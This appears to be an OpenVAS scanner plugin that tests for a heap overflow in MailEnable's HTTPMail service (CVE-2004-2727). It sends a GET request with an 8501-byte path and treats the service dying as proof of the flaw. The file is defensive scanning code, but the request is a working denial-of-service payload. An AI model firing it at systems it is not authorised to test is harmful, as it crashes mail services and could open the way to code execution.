# OpenVAS Vulnerability Test
# Description: MailEnable HTTPMail Service GET Overflow Vulnerability
#
# Authors:
# George A. Theall, <theall@tifaware.com>
#
# Copyright:
# Copyright (C) 2004 George A. Theall
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2,
# as published by the Free Software Foundation
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
#

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.14656");
  script_version("2019-04-24T07:26:10+0000");
  script_tag(name:"last_modification", value:"2019-04-24 07:26:10 +0000 (Wed, 24 Apr 2019)");
  script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:N/A:P");
  script_cve_id("CVE-2004-2727");
  script_bugtraq_id(10312);
  script_name("MailEnable HTTPMail Service GET Overflow Vulnerability");
  script_category(ACT_DENIAL);
  script_copyright("This script is Copyright (C) 2004 George A. Theall");
  script_family("Denial of Service");
  script_dependencies("gb_get_http_banner.nasl");
  script_require_ports("Services/www", 8080, 80);
  script_mandatory_keys("MailEnable/banner");

  script_tag(name:"solution", value:"Upgrade to MailEnable Professional / Enterprise 1.19 or
  later.");

  script_tag(name:"summary", value:"The target is running at least one instance of MailEnable that has
  a flaw in the HTTPMail service (MEHTTPS.exe) in the Professional and Enterprise Editions.");

  script_tag(name:"impact", value:"The flaw can be exploited by issuing an HTTP request exceeding 4045 bytes
  (8500 if logging is disabled), which causes a heap buffer overflow, crashing the HTTPMail service and
  possibly allowing for arbitrary code execution.");

  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"qod_type", value:"remote_vul");

  exit(0);
}

include("http_func.inc");

port = get_http_port(default:8080); # nb: HTTPMail defaults to 8080 but can run on any port.

banner = get_http_banner(port:port);
if(!banner || !egrep(pattern:"^Server: .*MailEnable", string:banner))
  exit(0);

soc = http_open_socket(port);
if(!soc)
  exit(0);

req = string(
  # assume logging is disabled.
  "GET /", crap(length:8501, data:"X"), " HTTP/1.0\r\n",
  "Host: ", get_host_ip(), "\r\n",
  "\r\n" );

send(socket:soc, data:req);
res = http_recv(socket:soc);
http_close_socket(soc);
if(!res) {
  soc = http_open_socket(port);
  if(!soc) {
    security_message(port:port);
    exit(0);
  } else {
    http_close_socket(soc);
  }
}

exit(99);